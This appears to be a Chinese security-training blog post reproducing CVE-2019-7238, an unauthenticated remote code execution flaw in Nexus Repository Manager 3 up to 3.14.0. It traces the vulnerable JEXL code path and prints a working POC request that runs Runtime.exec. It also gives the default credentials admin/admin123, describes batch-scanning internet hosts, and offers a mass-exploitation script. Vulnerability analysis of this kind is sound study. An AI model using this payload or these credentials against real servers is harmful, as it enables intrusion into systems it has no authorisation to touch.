> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KsTwsuWrcZs8FcmGnvGm7A)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

  

![](https://mmbiz.qpic.cn/mmbiz_png/siayVELeBkzWBXV8e57JJ4OyQuuMXTfadZCia0bN2sFBfdbTRlFx0S97kyKKjic5v6eaZ8cY4WQt0UEu4dkyowHYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rl6daM2XiabyLSr7nSTyAzcoZqPAsfe5tOOrXX0aciaVAfibHeQk5NOfQTdESRsezCwstPF02LeE4RHaH6NBEB9Rw/640?wx_fmt=png)

作者：掌控安全 - master

0X00
----

大家好，我是 Master 先生，一位学习道路上的行者。  

复现一个 Nexus Repository Manager 3 远程代码执行漏洞，名字看着全英文，感觉很高大上。

结果我用 Zoomeye 一搜, 竟然是中国人的天下。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NxXjvTtoUuH7309gGRC5n8Yo1ZGFrduicaDYEibYXJia9N1E7AG4LicKmHQ/640?wx_fmt=png)

事先声明，本文章仅用于学习交流，请勿用于其它用途！

0X01
----

首先介绍一下。

Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发 Maven，NuGET 等软件源仓库。  

其 3.14.0 及之前版本中，存在一处基于 OrientDB 自定义函数的任意 JEXL 表达式执行功能，而这处功能存在未授权访问漏洞，将可以导致任意命令执行漏洞。

2019 年 2 月 5 日 Sonatype 发布安全公告，在 Nexus Repository Manager 3 中由于存在访问控制措施的不足，未授权的用户可以利用该缺陷构造特定的请求在服务器上执行 Java 代码，从而达到远程代码执行的目的。

0X02
----

可能很多同学又怀疑我要安排代码吧，我先附赠一个简单的漏洞当作开始

  
nexus 存在弱口令 admin/admin123 可以进入。

当然存在好多弱口令，不要瞎搞呀，上一个测试截图。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nb07OTEQQicUo0qscN4icuZPNnvy9yt64NmK1qUibKnpJrYia8GQIfGeiaAA/640?wx_fmt=png)

如果说登录后还可以利用别的漏洞，这次不做研究，因为今天的主角不是他。

0X03
----

影响范围：Nexus Repository Manager OSS/Pro 3.6.2 版本到 3.14.0 版本

CVE-2019-7238:Nexus Repository Manager 3 远程代码执行漏洞

漏洞的触发主要分两部分：post 包解析及 jexl 表达式执行。

由于我的 JAVA 只有浅层次的学习，只能看懂部分。

过程分析参考了一下大佬的。看不懂，请忽略，附件有 POC

post 包解析

  
首先先看一下 web.xml 中如何做的路由解析：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N5b9iaibSxMjMQTENB6ra3iabArFquxza3yPkCTZ79EATxdFmj7WBONvng/640?wx_fmt=png)

org.sonatype.nexus.bootstrap.osgi.DelegatingFilter 拦截了所有的请求，

大概率为动态路由加载，动态路由加载需要配置相应的 Module 模块用代码将配置与路由进行绑定并显式加载 servlet，

而该漏洞的入口就在 org.sonatype.nexus.extdirect.internal.ExtDirectModule#configure 中:

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NZeu813HVicFgp0rkls3nzmibueYaK1N2Q0Gb3m2z0BblfMiaR0d791mNw/640?wx_fmt=png)

直接跟进 org.sonatype.nexus.extdirect.internal.ExtDirectServlet$doPost:

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NHNapVbOicKnhqBLZJGibGNfQBosbVpcGJSrMwCz8sniaZ5gf9ahWkuYZg/640?wx_fmt=png)

继续向下更进看到处理 post 请求的部分：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NkLkcJ46d7zNzxooqbhrOrzoricaeicksJ2c3K9SUgoahhJoSTkibj6EfA/640?wx_fmt=png)

在这里我们跟进看一下如何对 json 格式的请求进行处理：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NYyRKowS0rvsbsqjicEibOqRWicyU0jy9UDBj9um1C3M1P67rRiblibmlYhg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NBfgyXmdTpR21O4714F829KBicibT3wmRRcic7Eq4JpVbtSnsibbKy2Gcpw/640?wx_fmt=png)

首先对 json 的语法树进行解析，将数据提取出来：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NjDRBoyGPX6C6icg9j3wqTJeoYqeq6xaibmgC7HcSdDnYURR3gBMU7icyA/640?wx_fmt=png)

可以看到需要 5 个变量分别为 action、method、tid、type、data。

注意到 isBatched 是由参数长度决定的，而返回的一个数组，其长度为 1，所以 isBatched 为 false。

之后就是传入 processIndividualRequestsInThisThread 方法中：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NkWsvLQdPqPWNpap4zlc8cZCxQJTR47T6QUXiaCwQAnZts5jIH82T5cQ/640?wx_fmt=png)

在这里构造返回的结果，可以看到这里在有一个 json 序列化的过程，这里主要是将返回结果以 json 格式返回。

jexl 表达式执行，从 post 包的解析中可以得知我们需要构造 5 个参数，同时当我们构造好 action 和 method 后，可以直接动态调用相应的类与方法。

这个漏洞出现在 org.sonatype.nexus.coreui.ComponentComponent#previewAssets:

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NbDEnqkIVDLiczURk3qZMOdgIMZnN4tNibVsr7vouvd11r99Iic9yaZQLw/640?wx_fmt=png)

首先将 post 包中 repositoryName、expression、type 的值取出来

这三个参数分别代表已经存在的 repository 的名字、表达式，以及表达式的类型。

着重看一下 jexl 的处理过程：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nxld0mAhLzTiaecUsKubWFFgTSib9pgDSnRI8CMnAG623xya2KFtJRsUg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N6BHRh7TGxGyzKc0S07W0KzvXQ3OWJBSU5iawyr9R4ewRNic5M6k7KkUw/640?wx_fmt=png)

注意到这里只是实例化了一个 JexlSelector 对象，而并没有调用 evaluate 来执行表达式，所以漏洞的触发点在其他的位置。

而真正的表达式执行点在 browseService.previewAssets 的处理过程中，这一点也是这个漏洞最为难找的一个点。

跟进 previewAssets 的实现，在 org.sonatype.nexus.repository.browse.internal.BrowseServiceImpl#previewAssets：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NvJESll6iamnblP9icicg5AoXgkQZd0Y3ekvj37RjsJzXojyATr415rkCg/640?wx_fmt=png)

在这里可以看到表达式最后会被当做参数形成 SQL 查询，最后由 OrientDb 执行：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NeYJicR3W64PicDptvcNtaqyIU7vGdKSIAmPgFHzHdMAxQxwCjqeuJLBw/640?wx_fmt=png)

但是 OrientDb 本身是没有 contentExpression 这个方法的，

也就是说明这个方法是用 Java 来实现的，找了一下，在

org.sonatype.nexus.repository.selector.internal.ContentExpressionFunction：  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NzuHYCibtyTMt5cXanTjygwOib1wgpwDpDOuVFvq7H3no3Tq2otZ8VhEA/640?wx_fmt=png)

在 checkJexlExpression 中：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NpPvcyhiaISHtLUAW5cu9fiaoCicg80PsftqIAh7z2rsYFdocLILkaJayg/640?wx_fmt=png)

调用了 selectorManage.evaluate 来执行 jexl 表达式：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NliasibM61DibPHnLUunwB3o62BX9nkrXYtkFkYChPSgxMIQlcH3I58GRw/640?wx_fmt=other)

0X04
----

利用脚本批量扫了一下，看到还是存在很多的。  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NoicEDm7pqOtaQ56q3x17fh8mKkJOWHicicrW8SWvpvuoOoBLPtSXrpaRw/640?wx_fmt=png)

POC

```
POST /service/extdirect HTTP/1.1<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">Host:127.0.0.1:8081<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">Content-Type: application/json<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">Content-Length: 308<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">Connection: close<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":25,"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":4}<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nvo5yVFuTdD1xyXSDdlM6icGyyUzHeyLFVkxqSkDP7Eoic5e3tnbvmC1Q/640?wx_fmt=png)

附件放一个批量脚本

使用如图：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nb68VMOIVWYKgXQyf0rdicm6NYGLibv4I9W6QzcOH8rdFtgiaNGav3ZAMA/640?wx_fmt=png)

**附件后台回复：“002”**

  

**回顾往期内容**

[实战纪实 | 一次护网中的漏洞渗透过程](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247488327&idx=1&sn=c6677ad2bc524802c79c91a8982c2423&chksm=fa686a36cd1fe3207916178ce750add0fe89e6e0b6bdae53f42429d71a259d53cb39db41a7f5&scene=21#wechat_redirect)

[面试分享 #哈啰 / 微步 / 斗象 / 深信服 / 四叶草](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247491501&idx=1&sn=70aae2e2f83d503ca6fad3c4f952bd6e&chksm=fa6866dccd1fefca9de95e8c4c42b81637de45b73319931fcd9e5fdc3752774ac306f76b53f6&scene=21#wechat_redirect)

[反杀黑客 — 还敢连 shell 吗？蚁剑 RCE 第二回合~](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247485574&idx=1&sn=d951b776d34bfed739eb5c6ce0b64d3b&chksm=fa6871f7cd1ff8e14ad7eef3de23e72c622ff5a374777c1c65053a83a49ace37523ac68d06a1&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[防溯源防水表—APT 渗透攻击红队行动保障](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487533&idx=1&sn=30e8baddac59f7dc47ae87cf5db299e9&chksm=fa68695ccd1fe04af7877a2855883f4b08872366842841afdf5f506f872bab24ad7c0f30523c&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**